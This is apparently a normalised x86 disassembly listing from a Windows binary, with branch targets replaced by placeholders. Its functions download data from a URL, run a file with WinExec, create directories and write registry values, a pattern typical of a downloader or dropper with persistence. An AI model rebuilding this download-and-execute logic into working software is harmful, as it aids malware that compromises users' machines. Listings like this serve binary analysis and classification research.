push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_410e00
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
mov edx [ esi + 0x10 ]
mov ecx [ ebp + 0xc ]
or eax 0xffffffff
sub eax edx
cmp eax ecx
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
push r--data
call sub_41682d
test ecx ecx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
lea ebx [ edx + ecx ]
cmp ebx 0x7ffffffe
ja r-xdata
cmp ecx 0x8
jb r-xdata
cmp edi eax
jb r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
test ebx ebx
jne r-xdata
push edx
push ebx
mov ecx esi
call sub_408520
mov ecx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp ecx 0x8
jb r-xdata
mov eax [ esi + 0x10 ]
lea eax [ edx + eax * 2 ]
cmp eax edi
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
pop ebx
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_410f30
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
lea eax [ ecx + ecx ]
push eax
mov eax [ esi + 0x10 ]
push edi
lea eax [ edx + eax * 2 ]
push eax
call sub_41a1a0
add esp 0xc
test ecx ecx
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + ebx * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + ebx * 2 ] cx
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410f30
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
cmp eax edx
jb r-xdata
push r--data
call sub_41685b
mov ebx [ ebp + 0x10 ]
sub eax edx
mov edx [ esi + 0x10 ]
cmp eax ebx
cmovb ebx eax
or eax 0xffffffff
sub eax edx
cmp eax ebx
jbe r-xdata
push r--data
call sub_41682d
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ edx + ebx ]
cmp edi 0x7ffffffe
ja r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
push edx
push edi
mov ecx esi
call sub_408520
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
lea eax [ ebx + ebx ]
push eax
mov eax [ ebp + 0xc ]
lea eax [ ecx + eax * 2 ]
push eax
mov eax [ esi + 0x10 ]
lea eax [ edx + eax * 2 ]
push eax
call sub_41a1a0
add esp 0xc
test ebx ebx
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
sub_411040
push ebp
mov ebp esp
push 0xffffffff
push sub_430b98
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x30 ] eax
test eax eax
jne r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] ax
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
mov [ ebp - 0x4 ] 0x0
test ebx ebx
jne r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
jmp r-xdata
push 0x0
push 0x0
push eax
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov ebx eax
xor eax eax
test ebx ebx
jne r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_410210
xor eax eax
mov [ ebp - 0x1c ] ebx
mov [ ebp + ebx * 2 - 0x2c ] ax
jmp r-xdata
push ebx
push eax
push [ ebp - 0x30 ]
push edi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_410010
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov edi [ edi ]
cmp [ ebp - 0x18 ] 0x8
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
cmp [ edi + 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x2c ]
call j_sub_417912#2
add esp 0x4
sub_411160
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push 0x3e
push eax
mov [ ebp - 0x44 ] ax
lea eax [ ebp - 0x42 ]
push eax
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push 0x5
push esi
mov [ ebp - 0x48 ] 0x40
mov [ ebp - 0x4c ] 0x0
call [ HttpQueryInfoW@IAT ]
lea eax [ ebp - 0x44 ]
push eax
call sub_41832c
mov ecx [ ebp - 0x4 ]
add esp 0x4
xor ecx ebp
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub_4111d0
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
push ecx
push eax
lea eax [ ebp - 0x274 ]
push eax
call sub_411040
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x25c ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
cmp [ ebp - 0x260 ] 0x8
mov esi eax
jb r-xdata
mov eax [ eax ]
xor eax eax
mov [ ebp - 0x260 ] 0x7
mov [ ebp - 0x264 ] 0x0
mov [ ebp - 0x274 ] ax
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
push esi
call [ FindClose@IAT ]
mov ecx [ ebp - 0x8 ]
xor ecx ebp
mov al 0x1
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
xor al al
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub_411280
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ edx + 0x10 ]
xor esi esi
xor ebx ebx
xor eax eax
mov [ ebp - 0x4 ] 0x0
test edi edi
jle r-xdata
mov eax [ ebp + 0x10 ]
cmp esi 0x1
mov esi [ ebp + 0x8 ]
push ebx
setg cl
mov [ eax ] cl
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push edx
mov ecx esi
mov [ esi ] 0x0
call sub_401500
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
inc eax
cmp eax edi
jl r-xdata
inc esi
mov ebx eax
cmp [ ecx + eax ] 0x5c
jne r-xdata
cmp [ edx + 0x14 ] 0x10
jb r-xdata
sub_4112f0
push ebp
mov ebp esp
push 0xffffffff
push sub_430b60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x45 ]
push ecx
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x45 ] 0x1
call sub_411280
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x45 ] 0x0
je r-xdata
mov bl 0x1
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x2c ]
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
call sub_4111d0
test al al
jne r-xdata
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_401430
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x1
call sub_40dce0
cmp [ ebp - 0x30 ] 0x10
lea eax [ ebp - 0x44 ]
cmovae eax [ ebp - 0x44 ]
push 0x0
push eax
call [ WinExec@IAT ]
cmp [ ebp - 0x30 ] 0x10
jb r-xdata
cmp [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
push eax
call sub_419992
add esp 0x4
test eax eax
je r-xdata
push [ ebp - 0x44 ]
call j_sub_417912#2
add esp 0x4
xor bl bl
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
sub_411410
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x43c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x438 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
push ebx
mov [ esp + 0x18 ] eax
call sub_4112f0
xor edi edi
push edi
push edi
push edi
push edi
push r--data
mov [ esp + 0x50 ] 0x1
mov [ esp + 0x27 ] 0x0
call [ InternetOpenW@IAT ]
mov [ esp + 0x20 ] eax
test eax eax
je r-xdata
xor ebx ebx
push ecx
push [ esp + 0x18 ]
lea eax [ esp + 0x2c ]
push eax
call sub_411040
cmp [ eax + 0x14 ] 0x8
jb r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
push 0x0
push 0x4000000
push 0x0
push 0x0
push eax
push [ esp + 0x34 ]
call [ InternetOpenUrlW@IAT ]
cmp [ esp + 0x38 ] 0x8
mov [ esp + 0x18 ] eax
jb r-xdata
mov eax [ eax ]
mov ecx [ esp + 0x444 ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_4170bc
mov esp ebp
pop ebp
retn 0x10
cmp ebx edi
jne r-xdata
xor cl cl
cmp ebx edi
jne r-xdata
xor ecx ecx
mov [ esp + 0x38 ] 0x7
mov [ esp + 0x34 ] edi
mov [ esp + 0x24 ] cx
test eax eax
je r-xdata
push [ esp + 0x24 ]
call j_sub_417912#2
mov eax [ esp + 0x1c ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x438 ]
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x10
mov cl 0x1
jmp r-xdata
push [ esp + 0x20 ]
xor ebx ebx
call [ InternetCloseHandle@IAT ]
jmp r-xdata
push eax
call sub_411160
mov [ esp + 0x1c ] eax
test eax eax
jne r-xdata
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
test esi esi
je r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
xor al al
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x438 ]
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x10
push r--data
push ebx
call sub_419924
add esp 0x8
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
mov ebx [ ebx ]
push [ esp + 0x18 ]
mov ebx [ esp + 0x20 ]
call [ InternetCloseHandle@IAT ]
push [ esp + 0x20 ]
call [ InternetCloseHandle@IAT ]
jmp r-xdata
test esi esi
je r-xdata
mov ebx [ esp + 0x1c ]
cmp [ esp + 0x3c ] edi
jbe r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx ]
push [ esp + 0x14 ]
call sub_4184ba
add esp 0x4
mov [ esp + 0x13 ] 0x1
push [ esp + 0x18 ]
call [ InternetCloseHandle@IAT ]
push [ esp + 0x20 ]
call [ InternetCloseHandle@IAT ]
jmp r-xdata
lea ebx [ ebx ]
cmp [ esp + 0x3c ] 0x0
ja r-xdata
mov eax [ esi ]
push ebx
push edi
mov ecx esi
call [ eax + 0x4 ]
lea eax [ esp + 0x3c ]
push eax
push 0x3ff
lea eax [ esp + 0x48 ]
push eax
push [ esp + 0x24 ]
call [ InternetReadFile@IAT ]
mov eax [ esp + 0x3c ]
push [ esp + 0x14 ]
add edi eax
push eax
lea eax [ esp + 0x48 ]
push 0x1
push eax
call sub_417f55
add esp 0x10
test esi esi
je r-xdata
sub_411630
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] edi
call [ GetSystemDefaultLangID@IAT ]
movzx eax ax
push 0x2
push r--data
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_408240
mov eax [ ebp - 0x4 ]
mov esi rw-data
mov ebx 0x1d
add esi 0x54
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
je r-xdata
cmp [ esi - 0x2c ] eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi - 0x28 ] 0x0
lea edx [ esi - 0x28 ]
jne r-xdata
dec eax
jne r-xdata
mov ecx edx
lea edi [ ecx + 0x2 ]
lea ebx [ ebx ]
xor ecx ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ esi ] ax
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
mov edi [ ebp - 0xc ]
sar ecx 0x1
push ecx
push edx
mov eax esi
lea edx [ eax + 0x2 ]
push eax
push esi
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
jmp r-xdata
mov ecx edi
call sub_408240
sub_4116e0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x4 ] 0x0
pop esi
retn
push eax
call [ RegCloseKey@IAT ]
mov [ esi ] 0x0
sub_411710
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push 0x206
push eax
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push eax
mov [ ebp - 0x210 ] 0x0
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ ebp - 0x20c ] ax
jne r-xdata
lea ecx [ ebp - 0x20c ]
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x20c ]
push eax
mov ecx esi
call sub_408240
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub_4117d0
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x16
xor eax eax
push r--data
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x260 ] 0x7
mov [ ebp - 0x264 ] 0x0
mov [ ebp - 0x274 ] ax
call sub_408240
cmp [ ebp - 0x260 ] 0x8
lea ecx [ ebp - 0x25c ]
lea eax [ ebp - 0x274 ]
cmovae eax [ ebp - 0x274 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov esi [ CreateDirectoryW@IAT ]
mov edi [ FindClose@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call edi
cmp [ ebp - 0x260 ] 0x8
jb r-xdata
cmp [ ebp - 0x260 ] 0x8
jb r-xdata
push 0x20
xor eax eax
push r--data
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x260 ] 0x7
mov [ ebp - 0x264 ] 0x0
mov [ ebp - 0x274 ] ax
call sub_408240
cmp [ ebp - 0x260 ] 0x8
lea ecx [ ebp - 0x25c ]
lea eax [ ebp - 0x274 ]
cmovae eax [ ebp - 0x274 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
push 0x10
xor eax eax
push r--data
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x260 ] 0x7
mov [ ebp - 0x264 ] 0x0
mov [ ebp - 0x274 ] ax
call sub_408240
cmp [ ebp - 0x260 ] 0x8
lea ecx [ ebp - 0x25c ]
lea eax [ ebp - 0x274 ]
cmovae eax [ ebp - 0x274 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
jmp r-xdata
push eax
call edi
cmp [ ebp - 0x260 ] 0x8
jb r-xdata
cmp [ ebp - 0x260 ] 0x8
jb r-xdata
push eax
call edi
cmp [ ebp - 0x260 ] 0x8
jb r-xdata
cmp [ ebp - 0x260 ] 0x8
jb r-xdata
push 0x21
push r--data
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
push 0x0
push r--data
call esi
test eax eax
jne r-xdata
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
push 0x0
push r--data
call esi
push 0x1a
xor eax eax
push r--data
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x260 ] 0x7
mov [ ebp - 0x264 ] 0x0
mov [ ebp - 0x274 ] ax
call sub_408240
cmp [ ebp - 0x260 ] 0x8
lea ecx [ ebp - 0x25c ]
lea eax [ ebp - 0x274 ]
cmovae eax [ ebp - 0x274 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
push 0x0
push r--data
call esi
jmp r-xdata
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
push eax
call edi
cmp [ ebp - 0x260 ] 0x8
jb r-xdata
cmp [ ebp - 0x260 ] 0x8
jb r-xdata
push 0x1b
push r--data
jmp r-xdata
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
xor al al
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x274 ]
call j_sub_417912#2
add esp 0x4
mov ecx ebx
call sub_408240
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
mov al 0x1
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub_411a90
push ebp
mov ebp esp
push 0xffffffff
push sub_430ee2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx 0x13
mov esi r--data
lea edi [ ebp - 0x90 ]
[ edi ] [ esi ]
mov [ ebp - 0x118 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x114 ] eax
mov eax [ ebp + 0x14 ]
push 0x32
mov [ ebp - 0x11c ] eax
lea eax [ ebp - 0x42 ]
push 0x0
push eax
movsw [ edi ] [ esi ]
call sub_41cae0
add esp 0xc
lea ecx [ ebp - 0x90 ]
call sub_415380
xor eax eax
push eax
push r--data
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0xfc ] 0x7
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] ax
call sub_408240
mov edx 0x1
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0x4 ] 0x0
call sub_411630
xor ecx ecx
movzx eax [ ebp + ecx * 2 - 0x8e ]
cmp eax 0x41
jb r-xdata
cmp eax 0x5a
ja r-xdata
add ecx 0x2
cmp ecx 0x26
jl r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
mov [ ebp + ecx * 2 - 0x90 ] ax
movzx eax [ ebp + ecx * 2 - 0x90 ]
cmp eax 0x41
jb r-xdata
xor eax eax
push eax
push r--data
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0xb4 ] 0x7
mov [ ebp - 0xb8 ] 0x0
mov [ ebp - 0xc8 ] ax
call sub_408240
xor eax eax
mov [ ebp - 0x4 ] 0x1
push eax
push r--data
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0xe4 ] 0x7
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xf8 ] ax
call sub_408240
xor eax eax
mov [ ebp - 0x4 ] 0x2
push eax
push r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xcc ] 0x7
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xe0 ] ax
call sub_408240
xor eax eax
mov [ ebp - 0x4 ] 0x3
push eax
push r--data
lea ecx [ ebp - 0xb0 ]
mov [ ebp - 0x9c ] 0x7
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] ax
call sub_408240
lea eax [ ebp - 0xb0 ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0xf8 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_411f70
sub esp 0xc
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x98 ] 0x0
mov [ ebp - 0x94 ] 0x0
call sub_4143d0
mov esi [ RegSetValueExW@IAT ]
xor eax eax
cmp [ ebp - 0xb8 ] eax
setne al
test eax eax
sete al
test al al
je r-xdata
add eax 0x20
mov [ ebp + ecx * 2 - 0x8e ] ax
mov edx [ ebp - 0x98 ]
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ecx ebx
lea edi [ ecx + 0x2 ]
lea ecx [ ecx ]
mov ebx [ ebx ]
mov ecx ebx
lea edx [ ecx + 0x2 ]
mov ebx [ ebx ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
test edx edx
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
mov edx [ ebp - 0x98 ]
sar ecx 0x1
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0xd0 ] eax
setne al
test eax eax
sete al
test al al
je r-xdata
lea eax [ ecx * 2 + 0x2 ]
push eax
push ebx
push 0x1
push 0x0
push r--data
push edx
call esi
mov edx [ ebp - 0x98 ]
mov ebx [ ebp - 0x118 ]
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
lea eax [ ecx * 2 + 0x2 ]
push eax
push ebx
push 0x1
push 0x0
push r--data
push edx
call esi
mov ebx [ ebp - 0x114 ]
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x90 ]
lea edi [ ecx + 0x2 ]
jmp r-xdata
mov ecx ebx
lea edi [ ecx + 0x2 ]
mov ebx [ ebx ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
test edx edx
je r-xdata
sub ecx edi
sar ecx 0x1
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0xa0 ] eax
setne al
test eax eax
sete al
test al al
je r-xdata
lea eax [ ecx * 2 + 0x2 ]
push eax
push ebx
push 0x1
push 0x0
push r--data
push edx
call esi
mov edx [ ebp - 0x98 ]
lea eax [ ecx * 2 + 0x2 ]
push eax
lea eax [ ebp - 0x90 ]
push eax
push 0x1
push 0x0
push r--data
push edx
call esi
mov edx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x94 ]
test eax eax
je r-xdata
mov ebx [ ebp - 0x11c ]
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
test edx edx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x98 ]
mov [ ebp - 0x94 ] 0x0
mov ecx ebx
lea edi [ ecx + 0x2 ]
lea esp [ esp ]
mov ebx [ ebx ]
cmp [ ebp - 0x9c ] 0x8
jb r-xdata
push edx
call [ RegCloseKey@IAT ]
mov [ ebp - 0x98 ] 0x0
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0x9c ] 0x7
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] ax
jb r-xdata
push [ ebp - 0xb0 ]
call j_sub_417912#2
add esp 0x4
lea eax [ ecx * 2 + 0x2 ]
push eax
push ebx
push 0x1
push 0x0
push r--data
push edx
call esi
mov edx [ ebp - 0x98 ]
xor eax eax
cmp [ ebp - 0xe4 ] 0x8
mov [ ebp - 0xcc ] 0x7
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xe0 ] ax
jb r-xdata
push [ ebp - 0xe0 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0xb4 ] 0x8
mov [ ebp - 0xe4 ] 0x7
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xf8 ] ax
jb r-xdata
push [ ebp - 0xf8 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0xfc ] 0x8
mov [ ebp - 0xb4 ] 0x7
mov [ ebp - 0xb8 ] 0x0
mov [ ebp - 0xc8 ] ax
jb r-xdata
push [ ebp - 0xc8 ]
call j_sub_417912#2
add esp 0x4
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x10
push [ ebp - 0x110 ]
call j_sub_417912#2
add esp 0x4
sub_411f70
push ebp
mov ebp esp
push 0xffffffff
push sub_430dbb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5dc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x5e4 ] eax
mov eax [ ebp + 0x10 ]
sub esp 0xc
lea ecx [ ebp - 0x5dc ]
mov [ ebp - 0x5e0 ] eax
mov [ ebp - 0x5dc ] 0x0
mov [ ebp - 0x5d8 ] 0x0
call sub_4143d0
xor eax eax
push 0x40e
mov [ ebp - 0x4 ] 0x0
push eax
mov [ ebp - 0x5d0 ] ax
lea eax [ ebp - 0x5ce ]
push eax
call sub_41cae0
xor eax eax
push 0x5e
push eax
mov [ ebp - 0xc0 ] ax
lea eax [ ebp - 0xbe ]
push eax
call sub_41cae0
xor eax eax
push 0xfe
push eax
mov [ ebp - 0x1c0 ] ax
lea eax [ ebp - 0x1be ]
push eax
call sub_41cae0
xor eax eax
push 0x4e
push eax
mov [ ebp - 0x60 ] ax
lea eax [ ebp - 0x5e ]
push eax
call sub_41cae0
mov eax [ ebp - 0x5dc ]
